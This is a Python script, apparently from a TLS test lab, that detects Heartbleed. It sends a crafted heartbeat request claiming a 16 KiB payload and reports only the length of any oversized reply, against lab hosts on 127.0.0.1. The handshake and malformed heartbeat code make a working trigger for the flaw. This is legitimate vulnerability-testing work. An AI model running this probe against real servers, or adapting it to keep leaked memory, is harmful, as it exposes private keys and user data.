#!/usr/bin/env python3
"""heartbleed_oracle.py - independent Heartbleed check for the TLS lab.

Written from the protocol, NOT from the plugin, so that tests/lab/tls
verdicts do not rest on the code under test. TLS 1.1 ClientHello with the
heartbeat extension, read to ServerHelloDone, then a heartbeat request that
claims a 16 KiB payload but carries one byte. A vulnerable server answers
with a heartbeat record far larger than what was sent. Only the LENGTH of
the answer is printed; the returned bytes are never shown or kept.

Usage: python3 -I heartbleed_oracle.py HOST PORT [HELLO_VERSION_HEX]   (default 0302; use 0303
for servers that refuse TLS 1.1; lab targets on 127.0.0.1 only)
Exit: 0 vulnerable, 1 not vulnerable / no reply, 2 no handshake.
"""
import socket, struct, sys
host, port = sys.argv[1], int(sys.argv[2])
ver = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0x0302
ciphers = [0xc02f,0xc030,0xc014,0xc013,0x009e,0x0039,0x0033,0x0035,0x002f,0x000a,0x0005]
body  = struct.pack(">H", ver) + b"\x00"*32 + b"\x00"
body += struct.pack(">H", 2*len(ciphers)) + b"".join(struct.pack(">H", c) for c in ciphers)
body += b"\x01\x00"
ext = (b"\x00\x0a\x00\x04\x00\x02\x00\x17"          # supported_groups: secp256r1
       b"\x00\x0b\x00\x02\x01\x00"                   # ec_point_formats: uncompressed
       b"\x00\x0d\x00\x04\x00\x02\x04\x01"           # signature_algorithms: rsa_pkcs1_sha256
       b"\x00\x0f\x00\x01\x01")                       # heartbeat: peer_allowed_to_send
body += struct.pack(">H", len(ext)) + ext
hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
rec = b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs
s = socket.create_connection((host, port), timeout=5)
s.sendall(rec)
def recv_rec():
    hdr = b""
    while len(hdr) < 5:
        c = s.recv(5-len(hdr))
        if not c: return None
        hdr += c
    t, v, n = hdr[0], hdr[1:3], struct.unpack(">H", hdr[3:5])[0]
    d = b""
    while len(d) < n:
        c = s.recv(n-len(d))
        if not c: return None
        d += c
    return t, d
neg = struct.pack(">H", ver)   # replaced by the negotiated version from the ServerHello below
seen_done = False
while not seen_done:
    r = recv_rec()
    if r is None: print("closed during handshake"); sys.exit(2)
    t, d = r
    if t == 0x15: print("alert", d.hex()); sys.exit(2)
    if t == 0x16:
        i = 0
        while i + 4 <= len(d):
            hl = struct.unpack(">I", b"\x00"+d[i+1:i+4])[0]
            if d[i] == 2: neg = d[i+4:i+6]
            if d[i] == 14: seen_done = True
            i += 4 + hl
s.sendall(b"\x18" + neg + b"\x00\x03\x01\x40\x00")   # record version = negotiated version   # heartbeat_request, payload_length=0x4000, 1 real byte missing
s.settimeout(6)
try:
    r = recv_rec()
except socket.timeout:
    print("no reply (not vulnerable or ignored)"); sys.exit(1)
if r is None: print("connection closed, no heartbeat reply"); sys.exit(1)
t, d = r
if t == 0x18 and len(d) > 3: print("VULNERABLE: heartbeat reply of", len(d), "bytes"); sys.exit(0)
print("not vulnerable: record type", t, "len", len(d)); sys.exit(1)
